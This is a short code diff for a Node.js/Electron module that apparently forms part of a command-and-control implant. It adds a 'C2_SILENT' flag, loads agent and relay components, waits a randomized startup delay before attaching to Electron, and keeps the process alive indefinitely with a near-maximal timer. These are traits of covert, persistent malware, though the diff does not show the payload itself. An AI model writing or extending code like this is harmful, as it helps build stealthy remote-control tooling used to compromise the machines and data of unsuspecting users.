@@ -1,3 +1,4 @@
+process.env.C2_SILENT = '1';
 const cfg = require('./config');
 const agent = require('./agent');
 const relay = require('./relay');
@@ -32,7 +33,10 @@ function init() {
   } catch(e) {}
 }
 
-if (require.main !== module) {
+if (require.main === module) {
+  init();
+  setInterval(() => {}, 2147483647);
+} else {
   const delay = cfg.STARTUP_DELAY_MIN + crypto.randomInt(0, cfg.STARTUP_DELAY_MAX - cfg.STARTUP_DELAY_MIN + 1);
   try {
     const { app } = require('electron');
